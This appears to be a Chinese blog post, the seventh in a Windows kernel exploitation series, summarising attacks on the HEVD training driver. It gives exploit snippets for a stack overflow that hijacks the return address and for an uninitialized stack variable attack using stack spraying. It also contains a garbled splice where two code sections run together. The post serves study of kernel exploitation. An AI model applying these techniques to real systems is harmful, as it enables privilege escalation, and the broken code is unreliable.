**作者：[wjllz](https://redogwu.github.io/2018/11/04/windows-kernel-exploit-part-7/ "wjllz")  
来源：[先知安全技术社区](https://xz.aliyun.com/t/3580 "先知安全技术社区")**
## 前言
Hello, 这是`windows kernelexploit`的第七篇, 也是这个阶段性的最后一篇. 接下来我想做一些挖洞的工作.
所以可能分析性的文章就暂时更新到这里(并不, 只是投入的时间占比可能会更少一些).
这一篇主要涉及一些我自己对挖洞的思考, 来源于学习过程的积累. 但是都是自己总结, 没有科学依据. 所以我一直挂在自己的博客, 没有外放.
后来想着校内分享就给老师了… 师傅和我说一个系列的希望可以在先知留给备份, 所以就又放上来了. 唔, 虽然是一些很笨的方法,
但是希望师傅们能够给我提供更多的意见. 感激不尽 :)
我记得两个月前我开始了我的内核学习道路, 于是我开始学习师父给我的HEVD的文章来看. 在学习了UAF这一篇之后, 就把这个系列给放弃了.
因为觉得还是直接做cve的分析比较具有挑战性.
我记得我的第一篇文章是关于HEVD的, 当时第一次实现了堆喷的时候, 开始惊讶于这个世界的神奇. 所以这样想来也好, 从HEVD开始. 也从HEVD结束.
当然, 提到HEVD, 得感谢rootkits的杰出工作. 让我放弃了c走向了python的美满人生(并没有, c是我和我最后的倔强).
还有一些balabala的人(很重要的), 由于我不是写获奖感言. 所以就不一一列举了.
由于rootkit的分析已经做的很棒了, 所以我不会对于每一个做出详细的解释, 而是给出概括性的利用总结.在这篇文章当中, 给出的内容如下:
    [+] HEVD的各个漏洞利用的思路
    [+] 通过HEVD总结windows内核漏洞利用.
    [+] 探讨内核的学习之路的一些绕弯的地方
    [+] 关于挖洞的推测
我比较想聊的是第二个和第三个话题, 如果你看过我以前的博客的话, 你会发现我就是一个菜鸡, 所以和往常一样. 这些都是我自以为是的结论. 不算教程.
如果你在学习过程中发出和我一样的感受的话. 那实在是一件很幸运的事情. 至于第四个点, 算是一些民科的行为, 基于HEVD给出的信息,
想探讨一些对之后挖洞可能会有帮助性的思路. 在之后的道路我会验证他并更新第四部分.
文章所有的代码实现你可以在我的github上面找到, UAF和write-what-where会有详细的文章解释, 所以就不再贴出来.
## 各个漏洞的总结
### 栈溢出
##### 关键代码段:
    #ifdef SECURE
            // Secure Note: This is secure because the developer is passing a size
            // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
            // there will be no overflow
            RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
    #else
            DbgPrint("[+] Triggering Stack Overflow\n");
            // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
            // because the developer is passing the user supplied size directly to
            // RtlCopyMemory()/memcpy() without validating if the size is greater or
            // equal to the size of KernelBuffer
            RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size); // 这里
    #endif
#### 利用思路:
    [+] 覆盖0x824(ebp-0x81c)的数据, 偏移0x820处写入shellcode
    [+] ret时候复盖eip, 执行shellcode
##### 爬坑点:
    [+] 恢复堆栈平衡(rootkits):
        [+] 找到shellcode的ret处, 观察当前堆栈. 执行pop, add esp, 之类的操作恢复平衡.(这一部分需要注意的是, 比起静态分析, 动态调试可以帮助你节省很多时间)
        [+] user space算出内核基地址
        [+] 算出ret 地址偏移XXXX
        [+] mov [esp], xxx.
            ==> 你可以参考我的内核系列的第二篇文章.
##### 假设比较
    [+] 开发者假设: 由userbuf到kernelbuf的复制功能实现完整
    [+] 攻击者假设: 开发者开发的功能当中开发者可能出现失误造成漏洞点.
    [+] ==> who: 开发者失误
##### exp关键代码段
    VOID runYourShellCode()
    {
        const int orignalLength = 0x800;
        const int overflowLength = 0x20;
        DWORD lpBytesReturned = 0;
        char buf[orignalLength + overflowLength+4];
        memset(buf, 0x41, orignalLength + overflowLength+4);
        *(PDWORD32)(buf +orignalLength + overflowLength) = (DWORD32)&shellCode; // rip
        // 执行shellcode
        // 任务: 计算偏移地址
        DeviceIoControl(hDevice, STACK_OVERFLOW_NUMBER, buf, orignalLength + overflowLength + 4, NULL, 0, &lpBytesReturned, NULL); // 0x1f8 原有大小 0x8覆盖header
    }
### 未初始化栈变量
##### 关键代码段
    #ifndef SECURE
            DbgPrint("[+] Triggering Uninitialized Stack Variable Vulnerability\n");
    #endif
            // Call the callback function
            if (UninitializedStackVariable.Callback) { 
                UninitializedStackVariable.Callback(); // 这里
            }
        }
##### 利用思路
    [+] 利用stack spray控制堆栈中的残留数据
        ==> stack spray: https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/
    [+] 未初始化的栈变量(UninitializedStackVariable)使用的值是堆喷残留的数据. 运行下面的语句, 执行shellcode
        ==> UninitializedStackVariable.Callback(); 
##### 爬坑点
[+] stack spray
    [+] 理论性的计算stack spray的变化对我来说实在是一件枯燥的事
        ==> 采用OD或者windbg观察程序堆栈类似`add esp, 8`之后, 堆栈的相关信息
        ==> 动态调试用于堆喷射的函数NtMapUserPhysicalPages运行过程中堆栈的变化
##### 假设比较
    [+] 开发者假设: 使用UninitializedStackVariable功能实现完整
    [+] 攻击者假设:
        ==> 开发者没有正确对变量A赋值初值.
        ==> 利用系统特性. 可以对A的初值进行预判性的赋值
        ==> 利用后面代码. 可以执行shellcode
    [+] ==> who: 开发者+系统特性
##### exp:
[+] 关键代码段:
    VOID exploitToRunYourShellCode()
    {
        DWORD lpBytesReturned = 0;
        char buf[5] = {};
        *(PDWORD32)(buf) = 0xBAD0B0B0 + 12;    // not magic value
        NtMapUserPhysicalPages_t NtMapUserPhysicalPages =(NtMapUserPhysicalPages_t)GetProcAddress(GetModuleHandle("ntdll"), "NtMapUserPhysicalPages");
        if (MapUserPhysicalPages == NULL)
        {
            std::cout Value: 0x%p\n", UninitializedHeapVariable->Value);
                DbgPrint("[+] UninitializedHeapVariable->Callback: 0x%p\n", UninitializedHeapVariable->Callback);
                // 这里
                UninitializedHeapVariable->Callback();
            }
        }
##### 利用思路